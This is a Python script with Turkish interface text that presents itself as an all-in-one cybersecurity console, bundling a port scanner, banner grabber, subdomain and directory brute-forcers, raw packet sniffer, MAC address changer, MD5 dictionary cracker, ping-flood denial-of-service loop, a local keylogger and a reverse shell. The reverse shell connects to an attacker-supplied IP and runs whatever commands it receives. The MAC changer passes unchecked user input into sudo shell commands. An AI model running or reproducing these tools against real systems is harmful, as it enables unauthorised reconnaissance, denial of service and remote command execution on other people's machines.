import os
import sys
import time
import socket
import hashlib
import subprocess
import requests
from pynput.keyboard import Listener

def menu():
    print("\n" + "="*40)
    print("      HEPSİ BİR ARADA SİBER GÜVENLİK KONSOLU      ")
    print("="*40)
    print("[1] Port Tarayıcı (Port Scanner)")
    print("[2] Banner Grabbing (Servis Bilgisi)")
    print("[3] Subdomain Keşif Aracı")
    print("[4] Dizin Tarama Aracı")
    print("[5] Basit Paket Dinleyici (Sniffer - Root Gerekir)")
    print("[6] MAC Adresi Değiştirici (Linux)")
    print("[7] MD5 Hash Kırıcı")
    print("[8] Basit DoS / Ping Tufanı")
    print("[9] Keylogger Kontrolü")
    print("[10] Temel Arka Kapı (Reverse Shell)")
    print("[0] Çıkış")
    print("="*40)

def port_scanner():
    target = input("Hedef IP veya Domain: ")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080]
    print(f"\n{target} taranıyor...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        if s.connect_ex((target, port)) == 0:
            print(f"-> Port {port}: AÇIK")
        s.close()

def banner_grabbing():
    ip = input("Hedef IP: ")
    port = int(input("Port (Örn: 22): "))
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.settimeout(2)
        print("\nServis Bilgisi:", s.recv(1024).decode().strip())
        s.close()
    except Exception as e:
        print("Bağlantı hatası:", e)

def subdomain_finder():
    domain = input("Hedef Domain (Örn: google.com): ")
    subdomains = ["admin", "mail", "blog", "dev", "test", "shop", "vpn"]
    print("\nAlt alan adları aranıyor...")
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            requests.get(url, timeout=2)
            print(f"-> Bulundu: {url}")
        except requests.ConnectionError:
            pass

def dir_bruter():
    url = input("Hedef URL (Örn: http://127.0.0): ")
    if not url.endswith("/"): url += "/"
    directories = ["admin", "login", "uploads", "config.php", "panel", "db"]
    print("\nGizli dizinler aranıyor...")
    for dir in directories:
        full_url = f"{url}{dir}"
        try:
            res = requests.get(full_url, timeout=2)
            if res.status_code == 200:
                print(f"-> Dizin Mevcut [200 OK]: {full_url}")
        except Exception:
            pass

def sniffer():
    print("\nPaketler dinleniyor... Durdurmak için CTRL+C yapın.")
    try:
        sniffer_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sniffer_sock.bind(("0.0.0.0", 0))
        sniffer_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while True:
            print(sniffer_sock.recvfrom(65565))
    except PermissionError:
        print("HATA: Bu aracı çalıştırmak için Yönetici/Root yetkisi gerekiyor!")
    except KeyboardInterrupt:
        print("\nDinleme durduruldu.")

def mac_changer():
    if sys.platform.startswith('win'):
        print("HATA: Bu fonksiyon sadece Linux tabanlı sistemlerde çalışır.")
        return
    interface = input("Ağ Kartı (Örn: eth0, wlan0): ")
    new_mac = input("Yeni MAC Adresi (Örn: 00:11:22:33:44:55): ")
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
    os.system(f"sudo ifconfig {interface} up")
    print(f"MAC Adresi {new_mac} olarak güncellendi.")

def hash_cracker():
    target_hash = input("Kırılacak MD5 Hash değeri: ")
    wordlist = ["123456", "password", "1234", "admin", "qwerty", "secret"]
    for word in wordlist:
        guess = hashlib.md5(word.encode()).hexdigest()
        if guess == target_hash:
            print(f"\n[+] Şifre Bulundu: {word}")
            return
    print("\n[-] Şifre sözlükte bulunamadı.")

def ping_flood():
    target_ip = input("Hedef IP: ")
    print("Ping tufanı başladı... Durdurmak için CTRL+C yapın.")
    try:
        while True:
            # İşletim sistemine göre ping parametresi
            param = "-n" if sys.platform.startswith('win') else "-c"
            subprocess.Popen([f"ping {param} 1 {target_ip}"], shell=True, stdout=subprocess.DEVNULL)
            print(f"-> {target_ip} adresine paket gönderildi.")
            time.sleep(0.05)
    except KeyboardInterrupt:
        print("\nTufan durduruldu.")

def keylogger():
    print("\nKeylogger aktif. Tuşlar ekrana yazılıyor. Çıkmak için ESC tuşuna basın.")
    def on_press(key):
        print(f"Basılan Tuş: {key}")
        if str(key) == "Key.esc":
            return False
    with Listener(on_press=on_press) as listener:
        listener.join()

def reverse_shell():
    attacker_ip = input("Saldırgan IP (Dinleyici): ")
    port = int(input("Port (Dinleyici): "))
    print(f"\n{attacker_ip}:{port} adresine bağlanılmaya çalışılıyor...")
    try:
        s = socket.socket()
        s.connect((attacker_ip, port))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit": break
            output = subprocess.getoutput(command)
            s.send(output.encode() if output else b"Komut calisti fakat cikti uretmedi.")
        s.close()
    except Exception as e:
        print("Bağlantı kurulamadı:", e)

def main():
    while True:
        menu()
        secim = input("Lütfen çalıştırmak istediğiniz aracın numarasını seçin: ")
        if secim == "1": port_scanner()
        elif secim == "2": banner_grabbing()
        elif secim == "3": subdomain_finder()
        elif secim == "4": dir_bruter()
        elif secim == "5": sniffer()
        elif secim == "6": mac_changer()
        elif secim == "7": hash_cracker()
        elif secim == "8": ping_flood()
        elif secim == "9": keylogger()
        elif secim == "10": reverse_shell()
        elif secim == "0":
            print("Konsoldan çıkılıyor. Güvenli günler!")
            break
        else:
            print("Geçersiz seçim! Lütfen tekrar deneyin.")
        input("\nDevam etmek için ENTER tuşuna basın...")

if __name__ == "__main__":
    main()
